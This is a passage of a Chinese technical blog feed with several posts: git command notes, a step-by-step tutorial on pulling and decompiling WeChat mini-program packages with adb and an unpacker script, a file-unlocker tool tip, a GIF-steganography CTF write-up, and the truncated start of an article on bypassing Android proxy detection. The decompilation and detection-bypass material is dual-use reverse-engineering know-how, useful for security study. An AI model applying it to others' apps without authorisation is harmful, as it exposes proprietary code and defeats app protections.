plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout C1; git checkout main; git commit; git checkout C2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128135849053.png" alt="image-20210128135849053"></p><blockquote><p>这个动态过程是：HEAD先是指向c1,然后是main,让main提交了之后，又把head指向了C2</p></blockquote><p>实际这些命令并不是真的在查看 HEAD 指向,如果想看 HEAD 指向，可以通过 <code>cat .git/HEAD</code> 查看, 如果 HEAD 指向的是一个引用，还可以用 <code>git symbolic-ref HEAD</code> 查看它的指向。但是该程序不支持这两个命令</p><p><strong>分离的HEAD</strong></p><p>分离的 HEAD 就是让其指向了某个具体的提交记录而不是分支名</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128140319127.png" alt="image-20210128140319127"></p><p>HEAD -&gt; main -&gt; C1</p><p>HEAD 指向 main， main 指向 C1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout C1 后 HEAD -&gt; C1</span><br></pre></td></tr></table></figure><h3 id="相对引用"><a href="#相对引用" class="headerlink" title="相对引用"></a>相对引用</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128140638182.png" alt="image-20210128140638182"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128141007480.png" alt="image-20210128141007480"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout main^</span><br></pre></td></tr></table></figure><p>前：<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128141134514.png" alt="image-20210128141134514" style="zoom:67%;" />  后：<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128141151896.png" alt="image-20210128141151896" style="zoom:67%;" /></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout C3; git checkout HEAD^; git checkout HEAD^; git checkout HEAD^; </span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128141509116.png" alt="image-20210128141509116"></p><h3 id="操作符"><a href="#操作符" class="headerlink" title="~操作符"></a>~操作符</h3><p>该操作符后面可以跟一个数字（可选，不跟数字时与 <code>^</code> 相同，向上移动一次），指定向上移动多少次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout HEAD~4   # 一次后退四步</span><br></pre></td></tr></table></figure><h3 id="强制修改分支位置"><a href="#强制修改分支位置" class="headerlink" title="强制修改分支位置"></a>强制修改分支位置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch -f main HEAD~3   # 将 main 分支强制指向 HEAD 的第 3 级父提交</span><br></pre></td></tr></table></figure><p>前：<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128142230709.png" alt="image-20210128142230709" style="zoom: 80%;" /> 后：<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128174450402.png" alt="image-20210128174450402"></p><h3 id="撤销变更"><a href="#撤销变更" class="headerlink" title="撤销变更"></a>撤销变更</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128142751251.png" alt="image-20210128142751251"></p><p><code>git reset</code> 通过把分支记录回退几个提交记录来实现撤销改动。你可以将这想象成“改写历史”。</p><p><code>git reset</code> 向上移动分支，原来指向的提交记录就跟从来没有提交过一样。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset HEAD~1</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128142949097.png" alt="image-20210128142949097" style="zoom:67%;" /><p>Git 把 main 分支移回到 <code>C1</code>；现在我们的本地代码库根本就不知道有 <code>C2</code> 这个提交了。</p><blockquote><p>在reset后，<code>C2</code> 所做的变更还在，但是处于未加入暂存区状态。</p></blockquote><p>虽然在你的本地分支中使用 <code>git reset</code> 很方便，但是这种“改写历史”的方法对大家一起使用的远程分支是无效的哦！</p><p>为了撤销更改并<strong>分享</strong>给别人，我们需要使用 <code>git revert</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git revert HEAD</span><br></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128143230959.png" alt="image-20210128143230959" style="zoom:67%;" /><p>在我们要撤销的提交记录后面居然多了一个新提交！这是因为新提交记录 <code>C2&#39;</code> 引入了<strong>更改</strong> —— 这些更改刚好是用来撤销 <code>C2</code> 这个提交的。也就是说 <code>C2&#39;</code> 的状态与 <code>C1</code> 是相同的。</p><p>revert 之后就可以把你的更改推送到远程仓库与别人分享啦!</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128143358593.png" alt="image-20210128143358593"></p><h3 id="整理提交记录"><a href="#整理提交记录" class="headerlink" title="整理提交记录"></a>整理提交记录</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128144420185.png" alt="image-20210128144420185"></p><h4 id="Git-Cherry-pick"><a href="#Git-Cherry-pick" class="headerlink" title="Git Cherry-pick"></a>Git Cherry-pick</h4><ul><li><code>git cherry-pick &lt;提交号&gt;...</code></li></ul><p>如果你想将一些提交复制到当前所在的位置（<code>HEAD</code>）下面的话， Cherry-pick 是最直接的方式了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git cherry-pick C2 C4</span><br></pre></td></tr></table></figure><p>前：<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128145145422.png" alt="image-20210128145145422" style="zoom: 80%;" />  后：<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128145229565.png" alt="image-20210128145229565" style="zoom: 80%;" /></p><blockquote><p>因为head在main身上，所以在C5下又加了两个指定的提交</p></blockquote><h4 id="交互式的rebase"><a href="#交互式的rebase" class="headerlink" title="交互式的rebase"></a>交互式的rebase</h4><p>交互式 rebase 指的是使用带参数 <code>--interactive</code> 的 rebase 命令, 简写为 <code>-i</code></p><p>如果你在命令后增加了这个选项, Git 会打开一个 UI 界面并列出将要被复制到目标分支的备选提交记录，它还会显示每个提交记录的哈希值和提交说明，提交说明有助于你理解这个提交进行了哪些更改。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i HEAD~4</span><br></pre></td></tr></table></figure><h3 id="本地栈式提交"><a href="#本地栈式提交" class="headerlink" title="本地栈式提交"></a>本地栈式提交</h3><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128150737744.png" alt="image-20210128150737744"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128151616783.png" alt="image-20210128151616783" style="zoom:80%;" />变成<img src="C:\Users\zy\AppData\Roaming\Typora\typora-user-images\image-20210128151636293.png" alt="image-20210128151636293" style="zoom:80%;" /></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git checkout main</span><br><span class="line">git cherry-pick C4</span><br></pre></td></tr></table></figure><h3 id="提交的技巧"><a href="#提交的技巧" class="headerlink" title="提交的技巧"></a>提交的技巧</h3><p>接下来这种情况也是很常见的：你之前在 <code>newImage</code> 分支上进行了一次提交，然后又基于它创建了 <code>caption</code> 分支，然后又提交了一次。</p><p>此时你想对的某个以前的提交记录进行一些小小的调整。比如设计师想修改一下 <code>newImage</code> 中图片的分辨率，尽管那个提交记录并不是最新的了。</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128152722347.png" alt="image-20210128152722347"></p><h4 id="练习1"><a href="#练习1" class="headerlink" title="练习1"></a>练习1</h4><blockquote><p>是程序员1完成了图片代码编写并创建<code>newImage</code>分支提交了自己的代码，程序员2在<code>newImage</code>分支基础上创建了新的分支<code>caption</code>并提交了自己新的代码，现在主管觉得程序员1的代码写的有问题，需要进行修改并整合程序员2的代码</p></blockquote><p>由<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128154346107.png" alt="image-20210128154346107" style="zoom:67%;" />变为</p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128154327008.png" alt="image-20210128154327008" style="zoom:67%;" /><p>代码为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git rebase -i HEAD~2   # 调整C2 C3的顺序使得C2是最新的</span><br><span class="line">git commit --amend   # 更新C2</span><br><span class="line">git rebase -i HEAD~2   # 将C2 C3调整回来</span><br><span class="line">git branch -f main caption    # 让main指向caption的指向</span><br></pre></td></tr></table></figure><p>如果程序员1和程序员2开发不同的模块，这样调整没什么问题，但是如果他们对同一个代码进行了修改可能会造成代码冲突</p><p>更好的应该是使用<code>cherry-pick</code>，指令如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout main # 让HEAD指向main指向的记录</span><br><span class="line">git cherry-pcik newImage # 复制newImage到main</span><br><span class="line">git commit --amend # 更新newImage</span><br><span class="line">git cherry-pick caption # 复制caption</span><br></pre></td></tr></table></figure><p>你会发现使用<code>cherry-pick</code>后，分支的指向都会及时更新</p><h3 id="git-tag"><a href="#git-tag" class="headerlink" title="git tag"></a>git tag</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git tag V1 C1</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128155331105.png" alt="image-20210128155331105"></p><h3 id="两个父节点"><a href="#两个父节点" class="headerlink" title="两个父节点"></a>两个父节点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git checkout HEAD^2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128161749487.png" alt="image-20210128161749487"></p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128161834175.png" alt="image-20210128161834175"></p><h3 id="Git-Describe"><a href="#Git-Describe" class="headerlink" title="Git Describe"></a>Git Describe</h3><p>由于标签在代码库中起着“锚点”的作用，Git 还为此专门设计了一个命令用来<strong>描述</strong>离你最近的锚点（也就是标签），它就是 <code>git describe</code>！</p><p>Git Describe 能帮你在提交历史中移动了多次以后找到方向；当你用 <code>git bisect</code>（一个查找产生 Bug 的提交记录的指令）找到某个提交记录时，或者是当你坐在你那刚刚度假回来的同事的电脑前时， 可能会用到这个命令。</p><p><code>git describe</code> 的语法是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git describe &lt;ref&gt;</span><br></pre></td></tr></table></figure><p><code>&lt;ref&gt;</code> 可以是任何能被 Git 识别成提交记录的引用，如果你没有指定的话，Git 会以你目前所检出的位置（<code>HEAD</code>）。</p><p>它输出的结果是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;tag&gt;_&lt;numCommits&gt;_g&lt;hash&gt;</span><br></pre></td></tr></table></figure><p><code>tag</code> 表示的是离 <code>ref</code> 最近的标签， <code>numCommits</code> 是表示这个 <code>ref</code> 与 <code>tag</code> 相差有多少个提交记录， <code>hash</code> 表示的是你所给定的 <code>ref</code> 所表示的提交记录哈希值的前几位。</p><p>当 <code>ref</code> 提交记录上有某个标签时，则只输出标签名称</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128163000684.png" alt="image-20210128163000684"></p><h2 id="远程仓库"><a href="#远程仓库" class="headerlink" title="远程仓库"></a>远程仓库</h2><p>git clone</p><p>远程仓库默认为origin</p><h3 id="git-fetch"><a href="#git-fetch" class="headerlink" title="git fetch"></a>git fetch</h3><ul><li>从远程仓库获取数据</li></ul><p>当我们从远程仓库获取数据时, 远程分支也会更新以反映最新的远程仓库</p><p>前：<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128164915451.png" alt="image-20210128164915451">后：<img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128164937307.png" alt="image-20210128164937307"></p><p><code>C2</code>,<code>C3</code> 被下载到了本地仓库，同时远程分支 <code>o/main</code> 也被更新，反映到了这一变化</p><p><code>git fetch</code> 通常通过互联网（使用 <code>http://</code> 或 <code>git://</code> 协议) 与远程仓库通信。</p><p><code>git fetch</code> 并不会改变你本地仓库的状态。它不会更新你的 <code>main</code> 分支，也不会修改你磁盘上的文件。</p><h3 id="git-pull"><a href="#git-pull" class="headerlink" title="git pull"></a>git pull</h3><p>当远程分支中有新的提交时，你可以像合并本地分支那样来合并远程分支。也就是说就是你可以执行以下命令:</p><ul><li>git cherry-pick o/main</li><li>git rebase o/main</li><li>git merge o/main</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git pull</span><br><span class="line">等于</span><br><span class="line">git fetch; git merge o&#x2F;main</span><br></pre></td></tr></table></figure><h3 id="模拟团队合作"><a href="#模拟团队合作" class="headerlink" title="模拟团队合作"></a>模拟团队合作</h3><p><code>git fakeTeamwork</code> 默认操作就是在远程仓库的 main 分支上做一次提交。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git fakeTeamwork foo 3 # 模拟队友推送了 3 个提交记录到远程仓库的 foo 分支。</span><br></pre></td></tr></table></figure><h3 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h3><p>将<strong>我的</strong>变更上传到指定的远程仓库，并在远程仓库上合并你的新提交记录</p><p><img src="https://raw.githubusercontent.com/dummersoul/Picture/main/img/image-20210128170248358.png" alt="image-20210128170248358"></p><h3 id="偏离的提交历史"><a href="#偏离的提交历史" class="headerlink" title="偏离的提交历史"></a>偏离的提交历史</h3><p>由于远程仓库可能会存在被比人更改导致自己push的时候会出现失败的时候，解决：</p><p>我们用 <code>git fetch</code> 更新了本地仓库中的远程分支，然后<strong>合并</strong>了新变更到我们的本地分支（为了包含远程仓库的变更），最后我们用 <code>git push</code> 把工作推送到远程仓库</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git fetch; git merge o&#x2F;main; git push</span><br><span class="line">等价于</span><br><span class="line">git pull --rebase; git push</span><br><span class="line">git pull; git push</span><br></pre></td></tr></table></figure><h3 id="远程服务器拒绝-Remote-Rejected"><a href="#远程服务器拒绝-Remote-Rejected" class="headerlink" title="远程服务器拒绝!(Remote Rejected)"></a>远程服务器拒绝!(Remote Rejected)</h3><p>如果你是在一个大的合作团队中工作, 很可能是master被锁定了, 需要一些Pull Request流程来合并修改。如果你直接提交(commit)到本地master, 然后试图推送(push)修改, 你将会收到这样类似的信息:</p><p> <code>! [远程服务器拒绝] main -&gt; main (TF402455: 不允许推送(push)这个分支; 你必须使用pull request来更新这个分支.)</code></p><p><strong>解决方法</strong>：</p><p>新建一个分支feature, 推送到远程服务器. 然后reset你的master分支和远程服务器保持一致, 否则下次你pull并且他人的提交和你冲突的时候就会有问题.</p><p>未完待续。。。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>1、<a href="https://segmentfault.com/a/1190000038809934">https://segmentfault.com/a/1190000038809934</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微信小程序源码反编译操作教程</title>
      <link href="2023/11/28/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/"/>
      <url>2023/11/28/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%8E%B7%E5%8F%96%E6%BA%90%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>微信目前还没有对小程序的源码进行高级别的安全加密。仅仅是完成 Wxml -&gt; Html、 Wxml -&gt; JS、Wxss -&gt; Css的格式转换，然后再很简单地将图片、js和json文件压缩成一个包。获取到这个包，一步一步的倒退回去，就能获取到微信小程序源码。</p><h2 id="获取微信小程序的wxapkg包"><a href="#获取微信小程序的wxapkg包" class="headerlink" title="获取微信小程序的wxapkg包"></a>获取微信小程序的wxapkg包</h2><p>微信小程序的目录为</p><p>/data/data/com.tencent.mm/MicroMsg/xxxxxx(很长名字的一个文件夹，可根据时间来判断)/appbrand/pkg</p><p>微信小程序的格式是:.wxapkg</p><blockquote><p>要用adb进行调试时，需要拥有root权限，这里是在模拟器操作演示的，绝对的root权限</p></blockquote><p>首先，将这里面的文件拖到电脑</p><p><code>adb pull &lt;设备里的文件路径&gt; [电脑上的目录]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull &#x2F;data&#x2F;data&#x2F;com.tencent.mm&#x2F;MicroMsg&#x2F;3522c136c6b56430b3c1dcce0dfbf533&#x2F;appbrand&#x2F;pkg D:&#x2F;wxtmp&#x2F;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211111152831985.png" alt="image-20211111152831985"></p><p>已经在本地电脑上了</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211111152929666.png" alt="image-20211111152929666"></p><h2 id="脚本反编译"><a href="#脚本反编译" class="headerlink" title="脚本反编译"></a>脚本反编译</h2><p>此时需要脚本工具<a href="https://github.com/museL/wxappUnpacker-master">https://github.com/museL/wxappUnpacker-master</a></p><p>安装依赖 npm install xxxx，安装的依赖全在node_modules文件夹下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">npm install esprima</span><br><span class="line">npm install css-tree</span><br><span class="line">npm install cssbeautify</span><br><span class="line">npm install vm2</span><br><span class="line">npm install uglify-es</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211111162542743.png" alt="image-20211111162542743"></p><p>之后，在当前文件下执行命令对指定文件进行反编译</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node wuWxapkg.js D:\wxtmp\pkg\_1088601496_17.wxapkg</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211111161726733.png" alt="image-20211111161726733"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20211111162819277.png" alt="image-20211111162819277"></p><blockquote><p>这里要注意的是，我们从安卓里面拖出来有很多.wxapkg，那么反编译哪一个呢，在挨个尝试过程中，反编译会出现报错：Error: This package is unrecognizable.<br>May be this package is a subPackage which should be unpacked with -s=<MainDir>. 就是说名当前反编译的包不是工程文件夹，是微信的基础包，是无需还原的，所以就不管了，实际情况下应该就只能一个一个去尝试了吧，对这一方面还不是很懂。</p><p>从我测试的结果来看，这6个包里面只有1个包是没有任何报错的，说明这个是主包（_1088601496_17.wxapkg），反编译的文件都是js或者是html文件，这说明成功的获取到了源码，再将源码导入微信开发者工具中，就可以进行各种学习研究了。</p></blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qappleh/article/details/99717651">反编译获取任何微信小程序源码——看这篇就够了</a></p><p><a href="http://www.ddkiss.com/archives/187.html">2019年微信小程序源码反编译实践(支持微信7.x)</a></p><p><a href="https://www.xuanbiyijue.com/2021/03/13/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%EF%BC%88%E5%BA%94%E8%AF%A5%E6%98%AF%E5%85%A8%E7%BD%91%E6%9C%80%E5%85%A8%E4%BA%86%EF%BC%89/">微信小程序原理分析和多端小程序架构原理（应该是全网最全了）</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件被占用无法删除怎么办</title>
      <link href="2023/11/28/%E6%96%87%E4%BB%B6%E8%A2%AB%E5%8D%A0%E7%94%A8%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E6%80%8E%E4%B9%88%E5%8A%9E/"/>
      <url>2023/11/28/%E6%96%87%E4%BB%B6%E8%A2%AB%E5%8D%A0%E7%94%A8%E6%97%A0%E6%B3%95%E5%88%A0%E9%99%A4%E6%80%8E%E4%B9%88%E5%8A%9E/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>遇到文件被占用想删除，但就是找不到它被占用的进程</p><p>可以使用一个特别棒的工具 <code>IObit Unlocker</code></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226162149171.png" alt="image-20210226162149171"></p><p>工具下载地址：<a href="https://www.majorgeeks.com/mg/getmirror/iobit_unlocker,1.html">https://www.majorgeeks.com/mg/getmirror/iobit_unlocker,1.html</a></p><p>安装时勾选添加至右键的功能，在一个文件上右击选择</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226162301734.png" alt="image-20210226162301734"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210226162442649.png" alt="image-20210226162442649"></p><p>可以删除、重命名、移动、复制等任何操作，简直是利器啊朋友们！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片隐写之GIF</title>
      <link href="2023/11/28/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E4%B9%8BGIF/"/>
      <url>2023/11/28/%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E4%B9%8BGIF/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p><strong>GIF</strong> </p><p>首先想到用stegslove打开，进行逐帧查看，但是看的过程中发现有重影现象，重影的还不止一帧</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210224111557458.png" alt="image-20210224111557458"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210224111637532.png" alt="image-20210224111637532"></p><p>这种状况，要采用<img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210224111755611.png" alt="image-20210224111755611">工具</p><p>打开后点击f5预览，左右键查看帧</p><p>在有重影的那一页，右键编辑调色板，依次将倒数第二个色块颜色设置为同一种颜色，保存。</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210224112706488.png" alt="image-20210224112706488"></p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210224112720809.png" alt="image-20210224112720809"></p><p>就可以看清每一帧的字母，拼接起来进行base64解码</p><p><img src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/image-20210211020144003.png" alt="image-20210211020144003"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/u010391191/article/details/80831998">https://blog.csdn.net/u010391191/article/details/80831998</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅析APP代理检测对抗</title>
      <link href="2023/11/28/%E6%B5%85%E6%9E%90APP%E4%BB%A3%E7%90%86%E6%A3%80%E6%B5%8B%E5%AF%B9%E6%8A%97/"/>
      <url>2023/11/28/%E6%B5%85%E6%9E%90APP%E4%BB%A3%E7%90%86%E6%A3%80%E6%B5%8B%E5%AF%B9%E6%8A%97/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>文章首发：<a href="https://xz.aliyun.com/t/11398">https://xz.aliyun.com/t/11398</a></p><h2 id="1-前言"><a href="#1-前言" class="headerlink" title="1.前言"></a>1.前言</h2><p> 本文将从网络通信原理浅析在android中出现的一些代理转发检测，这些功能会使我们测试app时出现<strong>抓不到包</strong>或者<strong>应用闪退</strong>等情况，针对这种场景，我搭建了测试环境，并对其场景展开分析与实施应对方案。</p><h2 id="2-OSI-7层网络模型"><a href="#2-OSI-7层网络模型" class="headerlink" title="2.OSI 7层网络模型"></a>2.OSI 7层网络模型</h2><p>网络通信嘛，首先得知道什么是OSI 7层模型。下面是百度的解释：</p><blockquote><p>  为了使不同计算机厂家生产的计算机能够相互通信，以便在更大的范围内建立计算机网络，国际标准化组织（ISO）在1978年提出了“开放系统互联参考模型”，即著名的OSI/RM模型（Open System Interconnection/Reference Model）。</p><p>它将计算机网络体系结构的通信协议划分为七层，自下而上依次为：</p><p><a href="https://baike.baidu.com/item/%E7%89%A9%E7%90%86%E5%B1%82">物理层</a>（Physics Layer）、<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E9%93%BE%E8%B7%AF%E5%B1%82">数据链路层</a>（Data Link Layer）、<a href="https://baike.baidu.com/item/%E7%BD%91%E7%BB%9C%E5%B1%82/4329439">网络层</a>（Network Layer）、<a href="https://baike.baidu.com/item/%E4%BC%A0%E8%BE%93%E5%B1%82">传输层</a>（Transport Layer）、<a href="https://baike.baidu.com/item/%E4%BC%9A%E8%AF%9D%E5%B1%82">会话层</a>（Session Layer）、<a href="https://baike.baidu.com/item/%E8%A1%A8%E7%A4%BA%E5%B1%82">表示层</a>（Presentation Layer）、<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E5%B1%82/16412033">应用层</a>（Application Layer）</p></blockquote><p>使用网络数据的传输离不开网络协议七层模型，通过理解每一层协议的分工，也就能对网络故障逐一排查，这样的思维逻辑在安卓应用中也同样适用。</p><p><strong>OSI 7层模型</strong>各层功能及对应的协议、设备如下表所示：</p><table><thead><tr><th align="left">OSI对应的层</th><th align="left">功能</th><th align="left">TCP/IP对应的协议</th><th align="left">设备</th></tr></thead><tbody><tr><td align="left">应用层</td><td align="left">文件传输，电子邮件，文件服务，虚拟终端</td><td align="left">TFTP，HTTP，SNMP，FTP，SMTP，DNS，Telnet</td><td align="left">/</td></tr><tr><td align="left">表示层</td><td align="left">数据格式化，代码转换，数据加密</td><td align="left">/</td><td align="left">/</td></tr><tr><td align="left">会话层</td><td align="left">解除或建立与别的接点的联系</td><td align="left">/</td><td align="left">/</td></tr><tr><td align="left">传输层</td><td align="left">提供端对端的接口</td><td align="left">TCP，UDP</td><td align="left">四层交换机和四层路由</td></tr><tr><td align="left">网络层</td><td align="left">为数据包选择路由</td><td align="left">IP，ICMP，RIP，OSPF，BGP，IGMP</td><td align="left">三层交换机和路由</td></tr><tr><td align="left">数据链路层</td><td align="left">传输有地址的帧以及错误检测功能</td><td align="left">ARP，RARP，MTU，SLIP，CSLIP，PPP</td><td align="left">网桥、交换机、网卡</td></tr><tr><td align="left">物理层</td><td align="left">以二进制数据形式在物理媒体上传输数据</td><td align="left">ISO2110，IEEE802，IEEE802.2</td><td align="left">中继器、集线器、双绞线</td></tr></tbody></table><p>知识点：HTTPS协议是<code>HTTP+SSL</code></p><p>根据上表可知，SSL做数据加密是在表示层，也就是说，HTTPS实际上是建立在SSL之上的HTTP协议，而普通的HTTP协议是建立在TCP协议之上的。所以，当HTTPS访问URL时，由于URL在网络传送过程中最后是处于HTTP协议数据报头中，而HTTP协议位于SSL的上层，所以凡是HTTP协议所负责传输的数据就全部被加密了；但是IP地址并没加密，因为处理IP地址的协议（网络层）位于处理SSL协议（表示层）的下方。</p><p>额，说了这么多，就是要告诉你一个重要的关键点：数据的封装是<code>自下而上</code>的 ！在网络数据处理方面，如果是上层做了检测处理，则需要在同层或下层进行逻辑绕过，这就是攻与防的关键了，偷家（底层）才是硬道理。</p><p>接下来，我们再理解一下代理与VPN。</p><h2 id="3-代理与VPN"><a href="#3-代理与VPN" class="headerlink" 